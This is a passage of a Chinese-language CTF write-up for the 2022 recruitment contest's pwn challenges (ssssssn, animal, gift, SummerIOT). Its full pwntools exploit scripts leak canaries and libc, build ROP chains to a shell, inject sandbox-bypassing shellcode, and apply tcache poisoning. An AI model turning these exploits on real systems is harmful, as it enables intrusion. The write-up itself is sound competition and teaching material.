class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">sla(<span class="string">b&#x27;leave your name:&#x27;</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">7</span> * <span class="number">8</span> + p64(canary) +</span><br><span class="line">    p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;func&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">write_addr = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;write_addr&#x27;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc.address = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;leave your name:&#x27;</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">7</span> * <span class="number">8</span> + p64(canary) +</span><br><span class="line">    p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr) + p64(elf.sym[<span class="string">&#x27;func&#x27;</span>]))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ssssssn"><a href="#ssssssn" class="headerlink" title="ssssssn"></a>ssssssn</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/6.png" alt="6"><br>程序mmap了一块7权限的内存，然后读入13字节去执行<br><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/7.png" alt="7"><br>有沙盒，这里读入read的shllcode扩大shellcode的读入，然后orw即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> ShellcodeMall</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;recruit.qsnctf.com&#x27;</span></span><br><span class="line">port = <span class="number">10087</span></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x13b7)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(binary)</span></span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> sh.recvuntil(x, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sn</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> sh.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.recv(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> sh.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> sh.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">a, b</span>): <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;\033[1;35m&#123;&#125; ==&gt; &#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>((a), b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2bytes</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdx, 1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">orw = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">orw += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="number">0x10100</span>, <span class="number">0x40</span>)</span><br><span class="line">orw += shellcraft.write(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(asm(sc)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, gs)</span></span><br><span class="line">sla(<span class="string">b&#x27;you can input only 13 messages:\n&#x27;</span>, asm(sc))</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span> * <span class="built_in">len</span>(asm(sc)) + asm(orw))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="animal"><a href="#animal" class="headerlink" title="animal"></a>animal</h2><p>一个c++的程序<br><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/8.png" alt="8"><br>getAnimal函数可以leak地址，绕过pie<br>后面ret后门即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> ShellcodeMall</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;recruit.qsnctf.com&#x27;</span></span><br><span class="line">port = <span class="number">10085</span></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b getAnimal</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(binary)</span></span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> sh.recvuntil(x, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sn</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> sh.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x</span>): <span class="keyword">return</span> sh.recv(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> sh.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> sh.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">a, b</span>): <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;\033[1;35m&#123;&#125; ==&gt; &#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>((a), b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2bytes</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;3.show\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sn(<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, gs)</span></span><br><span class="line">sla(<span class="string">b&#x27;3.show\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">base_addr = u64(rv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;base_addr&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">shell = base_addr - <span class="number">0x4c52</span></span><br><span class="line">lg(<span class="string">&#x27;shell_addr&#x27;</span>, <span class="built_in">hex</span>(shell))</span><br><span class="line">sl(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;leave lase message\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(shell + <span class="number">8</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/9.png" alt="9"><br>一个整型溢出，直接写入 -2147483648</p>
<h2 id="SummerIOT"><a href="#SummerIOT" class="headerlink" title="SummerIOT"></a>SummerIOT</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>创建 note 时存在堆溢出。<img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221118150940282.png"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>创建多个堆块构造堆块重叠，获得 Unsortedbin 进行相关 leak</li>
<li>构造 Tcache Poisoning 劫持 __free_hook 为 gets ，去除 \x00 截断限制 __</li>
<li>利用 gets 在堆块上布置 rop 链子，free 掉 __free_hook 可以更改为我们的 gadget 进行 SROP </li>
<li>open 系统调用被 ban ，改用 openat</li>
</ol>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params"><span class="built_in">breakpoint</span>=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    glibc_dir = <span class="string">&#x27;~/Exps/Glibc/glibc-2.35/&#x27;</span></span><br><span class="line">    gdbscript = <span class="string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir</span><br><span class="line">    gdbscript += <span class="string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir</span><br><span class="line">    gdbscript += <span class="string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir</span><br><span class="line">    gdbscript += <span class="string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir</span><br><span class="line">    elf_base = <span class="built_in">int</span>(os.popen(<span class="string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">if</span> elf.pie <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    gdbscript += <span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(<span class="built_in">breakpoint</span>) + elf_base) <span class="keyword">if</span> <span class="built_in">isinstance</span>(<span class="built_in">breakpoint</span>, <span class="built_in">int</span>) <span class="keyword">else</span> <span class="built_in">breakpoint</span></span><br><span class="line">    gdb.attach(p, gdbscript)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(arch = elf.arch, os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>,terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;62&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8087</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    package = <span class="string">&#x27;&#x27;&#x27;POST /Login.cgi HTTP/1.1</span></span><br><span class="line"><span class="string">\nUser-Agent:IceCreeeam</span></span><br><span class="line"><span class="string">Data:Sup3rP@ssw0rd\n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>,package)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    package = <span class="string">&#x27;&#x27;&#x27;POST /Panel.cgi HTTP/1.1</span></span><br><span class="line"><span class="string">\nUser-Agent:IceCreeeam</span></span><br><span class="line"><span class="string">Data:1#&#123;&#125;#&#123;&#125;\n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">id</span>,data)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>,package)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    package = <span class="string">&#x27;&#x27;&#x27;POST /Panel.cgi HTTP/1.1</span></span><br><span class="line"><span class="string">\nUser-Agent:IceCreeeam</span></span><br><span class="line"><span class="string">Data:2#&#123;&#125;\n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>,package)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    package = <span class="string">&#x27;&#x27;&#x27;POST /Panel.cgi HTTP/1.1</span></span><br><span class="line"><span class="string">\nUser-Agent:IceCreeeam</span></span><br><span class="line"><span class="string">Data:3#&#123;&#125;\n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>,package)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Login</span></span><br><span class="line">login()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: HeapOverflow -&gt; Unsorted Chunk Overlap Tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;chunk%d&#x27;</span>%i)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;chunk7&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;chunk8&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;chunk9&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;chunk10&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;chunk11&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x80</span>*<span class="number">9</span>+<span class="number">1</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Leak libc,heap</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>,drop=<span class="literal">False</span>)[-<span class="number">6</span>:])</span><br><span class="line">libc_base = libc_leak - <span class="number">0x1e1075</span></span><br><span class="line">lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line">system_addr = libc.sym.system</span><br><span class="line">bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span 